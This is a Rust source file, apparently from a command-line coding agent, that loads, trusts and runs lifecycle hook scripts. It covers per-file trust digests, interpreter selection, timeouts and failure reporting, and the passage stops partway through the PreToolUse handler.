// Claude Code-compatible lifecycle hooks. Project hooks run only after the user
// explicitly trusts that folder; a project hook can never grant a permission
// (only deny). Home settings are trusted implicitly.
//
// Hook types supported:
//   type: "command"  — shell command string (existing format)
//   type: "python"   — path to a Python script (uses python3 or python)
//   type: "script"   — any executable script path; runtime detected by extension
//                      (.sh/.bash/.py/.rs everywhere; .ps1/.cmd/.bat on Windows)
//
// Scripts in ~/.buildwithnexus/hooks/<Event>/*.{sh,py} are auto-discovered
// without requiring settings.json entries.

use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::sync::{Mutex, OnceLock};
use std::thread;
use std::time::{Duration, Instant};

use serde_json::{json, Value};

use crate::config;
use crate::report;
use crate::trace;
use crate::tui;

#[derive(Clone, Copy, PartialEq)]
enum Source {
    Home,
    Project,
}

// Resolved command to run: either a shell command string or an interpreter+path.
#[derive(Clone)]
enum HookCmd {
    Shell(String),   // run via sh -c / cmd /C
    Script(PathBuf), // auto-detected interpreter by extension
}

// Watchdog defaults: a hung hook would otherwise freeze the single-threaded
// TUI forever. Overridable per hook via a `"timeout"` (seconds) settings field.
const DEFAULT_HOOK_TIMEOUT_SECS: u64 = 10;
// Exit codes recorded for hooks that never produced a real exit status. The
// outcome itself travels in `HookFailure`, so a hook's own `exit 124` is still
// an ordinary exit. (2 is reserved: it means "deny" to PreToolUse/UserPromptSubmit.)
const HOOK_TIMEOUT_CODE: i32 = 124; // matches timeout(1) convention
const HOOK_SPAWN_FAILED_CODE: i32 = 126;
const HOOK_SIGNAL_CODE: i32 = 128; // plus the signal number, like a shell

// Why a hook has no exit status of its own. PreToolUse blocks the call on any
// of these: a guard that never ran, or died midway, must not read as "allow".
enum HookFailure {
    TimedOut(Duration),
    NotStarted(String),
    Signal(Option<i32>),
    WaitFailed(String),
}

impl HookFailure {
    fn describe(&self) -> String {
        match self {
            HookFailure::TimedOut(d) => format!("timed out after {}", fmt_duration(*d)),
            HookFailure::NotStarted(e) => format!("could not start: {e}"),
            HookFailure::Signal(Some(n)) => format!("was killed by signal {n}"),
            HookFailure::Signal(None) => "was killed by a signal".into(),
            HookFailure::WaitFailed(e) => format!("could not be waited for: {e}"),
        }
    }
}

struct HookRun {
    code: i32,
    stdout: String,
    stderr: String,
    failure: Option<HookFailure>,
}

impl HookRun {
    fn not_started(err: String) -> Self {
        HookRun {
            code: HOOK_SPAWN_FAILED_CODE,
            stdout: String::new(),
            stderr: err.clone(),
            failure: Some(HookFailure::NotStarted(err)),
        }
    }

    // Trace title: "exit 0", or what went wrong.
    fn status(&self) -> String {
        match &self.failure {
            Some(f) => f.describe(),
            None => format!("exit {}", self.code),
        }
    }
}

struct Hook {
    event: String,
    matcher: String,
    cmd: HookCmd,
    source: Source,
    timeout: Duration,
}

struct Hooks {
    list: Vec<Hook>,
}

static HOOKS: OnceLock<Hooks> = OnceLock::new();

pub enum PreDecision {
    Continue,
    Allow,
    Deny(String),
}

pub fn init(cwd: &Path, interactive: bool) {
    let mut list = Vec::new();

    // Explicit hooks from settings files.
    if let Ok(text) = std::fs::read_to_string(config::home().join("settings.json")) {
        parse_into(&text, Source::Home, &mut list);
    }
    if let Ok(text) = std::fs::read_to_string(config::home().join("settings.local.json")) {
        parse_into(&text, Source::Home, &mut list);
    }
    // Trust is asked for once by `trust_project`; here it is only checked.
    for name in config::PROJECT_SETTINGS_FILES {
        let Ok(text) = std::fs::read_to_string(cwd.join(".buildwithnexus").join(name)) else {
            continue;
        };
        if project_file_trusted(cwd, name, &text) {
            parse_into(&text, Source::Project, &mut list);
        } else if interactive && has_hooks(&text) {
            tui::line(&tui::dim(&format!(
                "  (hooks in .buildwithnexus/{name} are not trusted — skipped)"
            )));
        }
    }

    // Auto-discovered scripts from ~/.buildwithnexus/hooks/<Event>/.
    for event in &[
        "SessionStart",
        "SessionEnd",
        "UserPromptSubmit",
        "PrePrompt",
        "PostResponse",
        "PreToolUse",
        "PostToolUse",
        "OnError",
        "Stop",
        "SubagentStop",
    ] {
        for script in config::discover_hook_scripts(event) {
            list.push(Hook {
                event: event.to_string(),
                matcher: "*".to_string(),
                cmd: HookCmd::Script(script),
                source: Source::Home,
                timeout: Duration::from_secs(DEFAULT_HOOK_TIMEOUT_SECS),
            });
        }
    }

    let _ = HOOKS.set(Hooks { list });
}

fn has_hooks(text: &str) -> bool {
    serde_json::from_str::<Value>(text)
        .ok()
        .and_then(|v| v["hooks"].as_object().map(|m| !m.is_empty()))
        .unwrap_or(false)
}

fn parse_into(text: &str, source: Source, out: &mut Vec<Hook>) {
    let Ok(v) = serde_json::from_str::<Value>(text) else {
        return;
    };
    let Some(events) = v["hooks"].as_object() else {
        return;
    };
    for (event, groups) in events {
        let Some(groups) = groups.as_array() else {
            continue;
        };
        for g in groups {
            let matcher = g["matcher"].as_str().unwrap_or("*").to_string();
            if let Some(hs) = g["hooks"].as_array() {
                for h in hs {
                    let cmd = match h["type"].as_str() {
                        Some("command") => {
                            h["command"].as_str().map(|c| HookCmd::Shell(c.to_string()))
                        }
                        Some("python") => h["script"]
                            .as_str()
                            .or_else(|| h["path"].as_str())
                            .map(|p| HookCmd::Script(PathBuf::from(p))),
                        Some("script") => h["path"]
                            .as_str()
                            .or_else(|| h["script"].as_str())
                            .map(|p| HookCmd::Script(PathBuf::from(p))),
                        _ => None,
                    };
                    if let Some(cmd) = cmd {
                        // Optional per-hook `"timeout"` in seconds (Claude Code compatible).
                        let timeout = h["timeout"]
                            .as_u64()
                            .filter(|&t| t > 0)
                            .unwrap_or(DEFAULT_HOOK_TIMEOUT_SECS);
                        out.push(Hook {
                            event: event.clone(),
                            matcher: matcher.clone(),
                            cmd,
                            source,
                            timeout: Duration::from_secs(timeout),
                        });
                    }
                }
            }
        }
    }
}

fn matches(matcher: &str, tool: &str) -> bool {
    let m = matcher.trim();
    m.is_empty() || m == "*" || m.split('|').any(|p| glob_match(p.trim(), tool))
}

// Case-sensitive wildcard match: `*` spans any run of characters (including
// none), `?` exactly one. Hand-rolled (no regex crate) with the classic
// single-backtrack-point algorithm, so it runs in O(n·m) worst case.
fn glob_match(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();
    let (mut pi, mut ti) = (0usize, 0usize);
    let mut star: Option<(usize, usize)> = None; // (pattern idx after '*', text idx)
    while ti < t.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == t[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some((pi + 1, ti));
            pi += 1;
        } else if let Some((sp, st)) = star {
            pi = sp;
            ti = st + 1;
            star = Some((sp, ti));
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

// ── session context shared by every payload ──────────────────────────────────
// Claude Code-compatible fields: `session_id` is the id the transcript is
// saved under, `transcript_path` its on-disk location, `permission_mode` the
// active gate ("ask" | "auto" | "readonly").
static PERMISSION_MODE: Mutex<Option<String>> = Mutex::new(None);

pub fn set_permission_mode(mode: &str) {
    if let Ok(mut m) = PERMISSION_MODE.lock() {
        *m = Some(mode.to_string());
    }
}

fn permission_mode() -> String {
    PERMISSION_MODE
        .lock()
        .ok()
        .and_then(|m| m.clone())
        .unwrap_or_else(|| "ask".to_string())
}

fn base_payload(event: &str, cwd: &Path) -> Value {
    let sid = crate::session::current_or_new();
    json!({
        "hook_event_name": event,
        "session_id": sid,
        "transcript_path": crate::session::path(&sid).to_string_lossy(),
        "permission_mode": permission_mode(),
        "cwd": cwd.to_string_lossy(),
    })
}

fn with_fields(mut payload: Value, extra: Value) -> Value {
    if let (Some(base), Some(add)) = (payload.as_object_mut(), extra.as_object()) {
        for (k, v) in add {
            base.insert(k.clone(), v.clone());
        }
    }
    payload
}

#[cfg(test)]
thread_local! {
    // Hooks for one test thread, in place of the process-wide list.
    static TEST_HOOKS: std::cell::RefCell<Option<Vec<Hook>>> = const { std::cell::RefCell::new(None) };
}

fn commands_for(event: &str, tool: Option<&str>) -> Vec<(HookCmd, Source, String, Duration)> {
    #[cfg(test)]
    if let Some(found) = TEST_HOOKS.with(|t| {
        t.borrow()
            .as_ref()
            .map(|list| select_hooks(list, event, tool))
    }) {
        return found;
    }
    let Some(h) = HOOKS.get() else {
        return Vec::new();
    };
    select_hooks(&h.list, event, tool)
}

fn select_hooks(
    list: &[Hook],
    event: &str,
    tool: Option<&str>,
) -> Vec<(HookCmd, Source, String, Duration)> {
    list.iter()
        .filter(|hk| hk.event == event)
        .filter(|hk| tool.is_none_or(|t| matches(&hk.matcher, t)))
        .map(|hk| (hk.cmd.clone(), hk.source, hk.matcher.clone(), hk.timeout))
        .collect()
}

fn source_label(source: Source) -> &'static str {
    match source {
        Source::Home => "home",
        Source::Project => "project",
    }
}

fn cmd_label(cmd: &HookCmd) -> String {
    match cmd {
        HookCmd::Shell(s) => trace::preview(s, 100),
        HookCmd::Script(path) => path.display().to_string(),
    }
}

// ── per-file project trust ──────────────────────────────────────────────────
// trusted.json maps a canonical project dir to one digest per settings file
// name, so trusting settings.json never trusts settings.local.json. The
// digest covers the file and every hook script it points at inside the
// project: a `git pull` that edits either asks again.
fn trust_path() -> PathBuf {
    config::home().join("trusted.json")
}

// SHA-256 (FIPS 180-4), hand-rolled to avoid a new dependency for one digest.
fn sha256(data: &[u8]) -> [u8; 32] {
    const K: [u32; 64] = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4,
        0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe,
        0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f,
        0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
        0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc,
        0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
        0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116,
        0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7,
        0xc67178f2,
    ];
    let mut h: [u32; 8] = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab,
        0x5be0cd19,
    ];
    let mut msg = data.to_vec();
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&((data.len() as u64).wrapping_mul(8)).to_be_bytes());
    for block in msg.as_chunks::<64>().0 {
        let mut w = [0u32; 64];
        for (i, word) in block.as_chunks::<4>().0.iter().enumerate() {
            w[i] = u32::from_be_bytes([word[0], word[1], word[2], word[3]]);
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16]
                .wrapping_add(s0)
                .wrapping_add(w[i - 7])
                .wrapping_add(s1);
        }
        let [mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh] = h;
        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ (!e & g);
            let t1 = hh
                .wrapping_add(s1)
                .wrapping_add(ch)
                .wrapping_add(K[i])
                .wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let t2 = s0.wrapping_add(maj);
            hh = g;
            g = f;
            f = e;
            e = d.wrapping_add(t1);
            d = c;
            c = b;
            b = a;
            a = t1.wrapping_add(t2);
        }
        for (x, v) in h.iter_mut().zip([a, b, c, d, e, f, g, hh]) {
            *x = x.wrapping_add(v);
        }
    }
    let mut out = [0u8; 32];
    for (i, x) in h.iter().enumerate() {
        out[i * 4..i * 4 + 4].copy_from_slice(&x.to_be_bytes());
    }
    out
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

// Files a hook entry may run: `script`/`python` paths, plus every word of a
// `command` string that looks like a path (so `sh ./hooks/x.sh` is covered).
fn hook_script_refs(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let Ok(v) = serde_json::from_str::<Value>(text) else {
        return out;
    };
    let Some(events) = v["hooks"].as_object() else {
        return out;
    };
    for groups in events.values() {
        for g in groups.as_array().into_iter().flatten() {
            for h in g["hooks"].as_array().into_iter().flatten() {
                for field in ["script", "path"] {
                    if let Some(p) = h[field].as_str() {
                        out.push(p.to_string());
                    }
                }
                if let Some(c) = h["command"].as_str() {
                    let words = c.split(|ch: char| {
                        ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')' | '<' | '>')
                    });
                    for w in words {
                        let w = w.trim_matches(|ch| ch == '"' || ch == '\'' || ch == '`');
                        if w.contains('/') || w.contains('\\') || w.contains('.') {
                            out.push(w.to_string());
                        }
                    }
                }
            }
        }
    }
    out
}

/// Digest of a project settings file plus the contents of every file inside
/// the project its hooks reference. A referenced file that is missing counts
/// too, so creating it later invalidates the trust.
pub fn trust_digest(cwd: &Path, text: &str) -> String {
    let root = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());
    let mut buf = text.as_bytes().to_vec();
    for r in hook_script_refs(text) {
        let p = Path::new(&r);
        let full = if p.is_absolute() {
            p.to_path_buf()
        } else {
            cwd.join(p)
        };
        let canon = full.canonicalize().ok();
        // Relative references that don't exist yet may appear inside the
        // project later; absolute ones outside it are the user's own files.
        let inside = match &canon {
            Some(c) => c.starts_with(&root),
            None => !p.is_absolute(),
        };
        if !inside {
            continue;
        }
        buf.extend_from_slice(b"\0");
        buf.extend_from_slice(r.as_bytes());
        buf.extend_from_slice(b"\0");
        match canon
            .filter(|c| c.is_file())
            .and_then(|c| std::fs::read(c).ok())
        {
            Some(bytes) => {
                buf.extend_from_slice(&sha256(&bytes));
            }
            None if full.exists() => buf.extend_from_slice(b"<not a file>"),
            None => buf.extend_from_slice(b"<missing>"),
        }
    }
    format!("sha256:{}", hex(&sha256(&buf)))
}

fn read_trust_store() -> Value {
    std::fs::read_to_string(trust_path())
        .ok()
        .and_then(|t| serde_json::from_str::<Value>(&t).ok())
        .filter(Value::is_object)
        .unwrap_or_else(|| json!({}))
}

/// Has the user trusted exactly this content of `<cwd>/.buildwithnexus/<name>`?
/// Never prompts.
pub fn project_file_trusted(cwd: &Path, name: &str, text: &str) -> bool {
    let store = read_trust_store();
    store[config::project_key(cwd)][name].as_str() == Some(trust_digest(cwd, text).as_str())
}

pub(crate) fn store_trust(cwd: &Path, files: &[config::UntrustedProjectFile]) {
    let mut store = read_trust_store();
    let key = config::project_key(cwd);
    // Entries written before per-file trust were a bare digest string.
    if !store[&key].is_object() {
        store[&key] = json!({});
    }
    for f in files {
        store[&key][f.name] = json!(trust_digest(cwd, &f.text));
    }
    if let Ok(t) = serde_json::to_string_pretty(&store) {
        config::ensure_home();
        let _ = std::fs::write(trust_path(), t);
    }
}

/// Called once at startup, before settings are used. Project settings keys
/// that could run code, redirect the API key, or loosen the gate are ignored
/// until the user trusts that file. Interactive: one prompt naming every such
/// key. Otherwise: one stderr warning, never a prompt.
pub fn trust_project(cwd: &Path, interactive: bool) {
    let pending = config::untrusted_project_files(cwd);
    if pending.is_empty() {
        return;
    }
    let listing: Vec<String> = pending
        .iter()
        .map(|f| format!(".buildwithnexus/{}: {}", f.name, f.keys.join(", ")))
        .map(|l| tui::sanitize_terminal(&l).into_owned())
        .collect();
    // The folder name comes from whoever made the checkout.
    let shown_cwd = tui::sanitize_terminal(&cwd.display().to_string()).into_owned();
    if !interactive {
        eprintln!(
            "{}",
            tui::yellow(&format!(
                "buildwithnexus: warning: ignoring untrusted project settings in {} ({}). \
                 Run bwn in a terminal there to review and trust them.",
                shown_cwd,
                listing.join("; ")
            ))
        );
        return;
    }
    let dir = config::project_key(cwd);
    let changed = read_trust_store().get(&dir).is_some();
    tui::line("");
    tui::line(&tui::yellow(&format!(
        "  ⚠ {} has project settings that can run commands, send your API key elsewhere, or loosen approvals:",
        shown_cwd
    )));
    for l in &listing {
        tui::line(&format!("    {l}"));
    }
    if changed {
        tui::line(&tui::dim(
            "    (settings for this folder changed since you last trusted them)",
        ));
    }
    let ans = tui::ask(&format!(
        "  Trust these project settings? {} ",
        tui::dim("[y/N]")
    ))
    .unwrap_or_default();
    if matches!(ans.trim().to_lowercase().as_str(), "y" | "yes") {
        store_trust(cwd, &pending);
    } else {
        tui::line(&tui::dim(
            "  (untrusted project settings ignored; harmless ones like model still apply)",
        ));
    }
}

// ── execution ────────────────────────────────────────────────────────────────
fn interpreter_for(path: &Path) -> Result<(&'static str, Vec<&'static str>), String> {
    let ext = path.extension().map(|e| e.to_string_lossy().to_lowercase());
    interpreter_for_ext(ext.as_deref(), cfg!(windows), &interpreter_available).map_err(|missing| {
        let hint = if cfg!(windows) && (missing == "sh" || missing == "bash") {
            " (install Git for Windows for Git Bash, or use a .ps1/.cmd hook)"
        } else {
            ""
        };
        format!("interpreter `{missing}` not found on PATH{hint}")
    })
}

// Does `<bin> --version` run and succeed? (Success, not just spawn: the
// Windows Store `python3` alias stub exits non-zero.)
fn interpreter_available(bin: &str) -> bool {
    std::process::Command::new(bin)
        .arg("--version")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

// Picks the interpreter for a script by extension. `available` probes PATH;
// `windows` selects the Windows table. Err carries the name of the missing
// interpreter when nothing usable is on PATH.
fn interpreter_for_ext(
    ext: Option<&str>,
    windows: bool,
    available: &dyn Fn(&str) -> bool,
) -> Result<(&'static str, Vec<&'static str>), String> {
    match ext {
        Some("py") | Some("python") => {
            // Prefer python3; fall back to python (the only name the
            // python.org Windows installer provides).
            if available("python3") {
                Ok(("python3", vec![]))
            } else {
                Ok(("python", vec![]))
            }
        }
        Some("ps1") if windows => Ok((
            "powershell.exe",
            vec!["-NoProfile", "-ExecutionPolicy", "Bypass", "-File"],
        )),
        Some("cmd") | Some("bat") if windows => Ok(("cmd.exe", vec!["/C"])),
        Some("bash") if !windows => Ok(("bash", vec![])),
        // Shell scripts: run as `sh /path/script.sh` — NOT `sh -c /path/script.sh`
        // (the -c form treats the path as a command string, not a script file).
        _ if !windows => Ok(("sh", vec![])),
        // Windows: no shell by default. Git for Windows puts `sh`/`bash` on
        // PATH; without either there's nothing sensible to run a .sh with.
        Some("bash") => {
            if available("bash") {
                Ok(("bash", vec![]))
            } else if available("sh") {
                Ok(("sh", vec![]))
            } else {
                Err("bash".to_string())
            }
        }
        _ => {
            if available("sh") {
                Ok(("sh", vec![]))
            } else if available("bash") {
                Ok(("bash", vec![]))
            } else {
                Err("sh".to_string())
            }
        }
    }
}

fn run_hook_cmd(cmd: &HookCmd, payload: &Value, cwd: &Path, timeout: Duration) -> HookRun {
    match cmd {
        HookCmd::Shell(s) => run_shell(s, payload, cwd, timeout),
        HookCmd::Script(path) => run_script(path, payload, cwd, timeout),
    }
}

// The shell reports a command it could not find (127) or could not execute
// (126) as an ordinary exit status; `cmd /C` uses 9009 for "not recognized".
fn shell_could_not_start(code: i32) -> bool {
    if cfg!(windows) {
        code == 9009
    } else {
        code == 126 || code == 127
    }
}

fn first_line(s: &str) -> &str {
    s.lines()
        .map(str::trim)
        .find(|l| !l.is_empty())
        .unwrap_or("")
}

fn run_shell(cmd: &str, payload: &Value, cwd: &Path, timeout: Duration) -> HookRun {
    let mut c = if cfg!(windows) {
        let mut x = Command::new("cmd");
        x.args(["/C", cmd]);
        x
    } else {
        let mut x = Command::new("sh");
        x.args(["-c", cmd]);
        x
    };
    let mut run = run_child(
        c.current_dir(cwd).env("BWN_PROJECT_DIR", cwd),
        payload,
        timeout,
    );
    if run.failure.is_none() && shell_could_not_start(run.code) {
        let why = match first_line(&run.stderr) {
            "" => format!("the shell exited {}", run.code),
            l => trace::preview(l, 200),
        };
        run.failure = Some(HookFailure::NotStarted(why));
    }
    run
}

fn run_script(path: &Path, payload: &Value, cwd: &Path, timeout: Duration) -> HookRun {
    // Checked here: the interpreter would report a missing or unreadable
    // script as an ordinary exit status (bash 127, dash 2).
    let full = cwd.join(path);
    match std::fs::File::open(&full).and_then(|f| f.metadata()) {
        Err(e) => return HookRun::not_started(e.to_string()),
        Ok(m) if !m.is_file() => return HookRun::not_started("not a file".into()),
        Ok(_) => {}
    }
    if path.extension().is_some_and(|e| e == "rs" || e == "rust") {
        return run_rust_hook(&full, payload, cwd, timeout);
    }
    let (interp, interp_args) = match interpreter_for(path) {
        Ok(i) => i,
        Err(e) => return HookRun::not_started(e),
    };
    let mut c = Command::new(interp);
    for a in interp_args {
        c.arg(a);
    }
    c.arg(path);
    run_child(
        c.current_dir(cwd).env("BWN_PROJECT_DIR", cwd),
        payload,
        timeout,
    )
}

fn run_rust_hook(path: &Path, payload: &Value, cwd: &Path, timeout: Duration) -> HookRun {
    if Command::new("rust-script")
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
    {
        let mut c = Command::new("rust-script");
        c.arg(path);
        return run_child(
            c.current_dir(cwd).env("BWN_PROJECT_DIR", cwd),
            payload,
            timeout,
        );
    }
    // Compiled into the user's own ~/.buildwithnexus (0700), not a shared
    // temp dir where another user could swap the binary before it runs. The
    // name carries a hash of the source, so two hooks with the same file
    // name never overwrite each other.
    let cache_dir = crate::config::home().join("cache").join("rust-hooks");
    let _ = std::fs::create_dir_all(&cache_dir);
    let stem = path
        .file_stem()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| "hook".into());
    let digest = {
        use std::hash::{Hash, Hasher};
        let mut h = std::collections::hash_map::DefaultHasher::new();
        std::fs::read(path).unwrap_or_default().hash(&mut h);
        path.hash(&mut h);
        h.finish()
    };
    let bin_path = cache_dir.join(format!(
        "{stem}-{digest:016x}{}",
        std::env::consts::EXE_SUFFIX
    ));
    // Diagnostics are captured, not printed over the TUI; the first one
    // explains the failure. A hook that does not compile never ran.
    let compiled = Command::new("rustc")
        .args(["--edition=2021", "-O"])
        .arg(path)
        .arg("-o")
        .arg(&bin_path)
        .stdin(Stdio::null())
        .output();
    match compiled {
        Ok(o) if o.status.success() => {
            let mut c = Command::new(&bin_path);
            run_child(
                c.current_dir(cwd).env("BWN_PROJECT_DIR", cwd),
                payload,
                timeout,
            )
        }
        Ok(o) => {
            let stderr = String::from_utf8_lossy(&o.stderr);
            HookRun::not_started(format!(
                "rustc failed to compile it ({})",
                trace::preview(first_line(&stderr), 200)
            ))
        }
        Err(e) => HookRun::not_started(format!("rustc: {e}")),
    }
}

// Loud, unmissable warning for a hook that failed or exited non-zero — a
// deny-capable hook that silently never fires would bypass its policy.
fn hook_warn(msg: &str) {
    // Program paths, commands and stderr come from settings files, a hooks
    // folder and hook output.
    let msg = tui::sanitize_terminal(msg);
    if report::is_json() {
        eprintln!("[hook] warning: {msg}");
    } else {
        tui::line(&tui::yellow(&format!("  [hook] ⚠ {msg}")));
    }
}

// What to do about a hook that failed, for the message that names it.
fn fix_hint(source: Source, cmd: &HookCmd, failure: &HookFailure) -> String {
    let discovered = matches!(cmd, HookCmd::Script(p)
        if source == Source::Home && p.starts_with(config::home().join("hooks")));
    let fix = match failure {
        HookFailure::TimedOut(_) if !discovered => {
            "Make it finish sooner or raise its \"timeout\" (seconds)"
        }
        HookFailure::TimedOut(_) => "Make it finish sooner",
        _ => "Fix it",
    };
    let file = match source {
        _ if discovered => return format!("{fix}, or delete the script."),
        Source::Home => config::home().join("settings.json").display().to_string(),
        Source::Project => ".buildwithnexus/settings.json".to_string(),
    };
    format!("{fix}, or remove it from \"hooks\" in {file} (or settings.local.json).")
}

// Shows a hook that failed or exited non-zero without blocking anything (the
// Claude Code "non-blocking error"). Only PreToolUse turns a failure into a
// block; for every other event a hook that stops working must still be seen.
fn report_problem(event: &str, source: Source, cmd: &HookCmd, run: &HookRun) {
    if let Some(msg) = problem_message(event, source, cmd, run) {
        hook_warn(&msg);
    }
}

fn problem_message(event: &str, source: Source, cmd: &HookCmd, run: &HookRun) -> Option<String> {
    let label = cmd_label(cmd);
    if let Some(f) = &run.failure {
        return Some(format!(
            "{event} hook `{label}` {}. {}",
            f.describe(),
            fix_hint(source, cmd, f)
        ));
    }
    if run.code == 0 {
        return None;
    }
    let detail = match first_line(&run.stderr) {
        "" => String::new(),
        l => format!(": {}", trace::preview(l, 200)),
    };
    Some(format!(
        "{event} hook `{label}` exited {}{detail}",
        run.code
    ))
}

// Drain a pipe on its own thread and deliver the bytes over a channel. A
// channel (rather than a JoinHandle) lets the collector bound how long it waits:
// when a timed-out hook leaves a grandchild holding the pipe open, `read_to_end`
// never returns, and joining the thread would block for the grandchild's full
// lifetime. The orphaned thread ends on its own when the pipe finally closes.
// Human-readable hook timeout: whole seconds when ≥1s, else milliseconds, so a
// sub-second deadline doesn't render as a confusing "0s".
fn fmt_duration(d: Duration) -> String {
    if d.as_secs() >= 1 {
        format!("{}s", d.as_secs())
    } else {
        format!("{}ms", d.as_millis())
    }
}

fn drain_pipe<R: Read + Send + 'static>(r: Option<R>) -> Option<mpsc::Receiver<Vec<u8>>> {
    r.map(|mut pipe| {
        let (tx, rx) = mpsc::channel();
        thread::spawn(move || {
            let mut buf = Vec::new();
            let _ = pipe.read_to_end(&mut buf);
            let _ = tx.send(buf);
        });
        rx
    })
}

// Collect drained bytes, waiting at most `grace`. On the normal path the child
// has already exited (pipes at EOF), so the thread has sent and this returns at
// once; on the timeout path it caps the wait instead of blocking on a surviving
// grandchild.
fn join_pipe(rx: Option<mpsc::Receiver<Vec<u8>>>, grace: Duration) -> String {
    rx.and_then(|rx| rx.recv_timeout(grace).ok())
        .map(|b| String::from_utf8_lossy(&b).into_owned())
        .unwrap_or_default()
}

// Runs one hook process. Failures are returned, not reported: the caller
// names the hook and decides whether the failure blocks.
fn run_child(c: &mut Command, payload: &Value, timeout: Duration) -> HookRun {
    let program = c.get_program().to_string_lossy().into_owned();
    c.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = match c.spawn() {
        Ok(ch) => ch,
        Err(e) => return HookRun::not_started(format!("{program}: {e}")),
    };
    // Feed stdin and drain both output pipes on threads so a hook that never
    // reads its input (or floods a pipe) can't wedge the single-threaded TUI.
    let stdin_h = child.stdin.take().map(|mut sin| {
        let body = payload.to_string();
        thread::spawn(move || {
            let _ = sin.write_all(body.as_bytes());
        })
    });
    let stdout_h = drain_pipe(child.stdout.take());
    let stderr_h = drain_pipe(child.stderr.take());

    // Watchdog: poll for exit; kill the hook when the deadline passes.
    let deadline = Instant::now() + timeout;
    let mut timed_out = false;
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break Ok(st),
            Ok(None) => {
                if Instant::now() >= deadline {
                    timed_out = true;
                    let _ = child.kill();
                    let _ = child.wait();
                    break Err(HookFailure::TimedOut(timeout));
                }
                thread::sleep(Duration::from_millis(25));
            }
            Err(e) => {
                let _ = child.kill();
                let _ = child.wait();
                break Err(HookFailure::WaitFailed(e.to_string()));
            }
        }
    };
    if let Some(h) = stdin_h {
        let _ = h.join();
    }
    // On a clean exit the pipes are already at EOF so this returns immediately;
    // after a timeout it caps how long we wait on a possibly-orphaned pipe.
    let grace = if timed_out {
        Duration::from_millis(500)
    } else {
        Duration::from_secs(5)
    };
    let stdout = join_pipe(stdout_h, grace);
    let stderr = join_pipe(stderr_h, grace);
    let (code, failure) = match status {
        Ok(st) => match st.code() {
            Some(code) => (code, None),
            // Signal-killed: never report exit 0 for a hook that died.
            None => {
                #[cfg(unix)]
                let sig = std::os::unix::process::ExitStatusExt::signal(&st);
                #[cfg(not(unix))]
                let sig = None;
                (
                    HOOK_SIGNAL_CODE + sig.unwrap_or(0),
                    Some(HookFailure::Signal(sig)),
                )
            }
        },
        Err(f @ HookFailure::TimedOut(_)) => (HOOK_TIMEOUT_CODE, Some(f)),
        Err(f) => (HOOK_SPAWN_FAILED_CODE, Some(f)),
    };
    HookRun {
        code,
        stdout,
        stderr,
        failure,
    }
}

fn decision_field(j: &Value) -> Option<&str> {
    j["hookSpecificOutput"]["permissionDecision"]
        .as_str()
        .or_else(|| j["permissionDecision"].as_str())
        .or_else(|| j["decision"].as_str())
}

pub fn pre_tool_use(tool: &str, input: &Value, cwd: &Path) -> PreDecision {
    let payload = with_fields(
        base_payload("PreToolUse", cwd),
        json!({"tool_name": tool, "tool_input": input}),
    );
    for (cmd, source, matcher, timeout) in commands_for("PreToolUse", Some(tool)) {
        if !report::is_json() {
            tui::line(&tui::dim(&format!("  [hook] PreToolUse:{tool}")));
        }
        trace::record_visible(
            "hook",
            format!("PreToolUse:{tool} {}", cmd_label(&cmd)),
            json!({
                "event": "PreToolUse",
                "tool": tool,
                "matcher": matcher,
                "source": source_label(source),
                "command": cmd_label(&cmd),
                "trigger": payload,
            }),
        );
        let run = run_hook_cmd(&cmd, &payload, cwd, timeout);
        trace::record_visible(
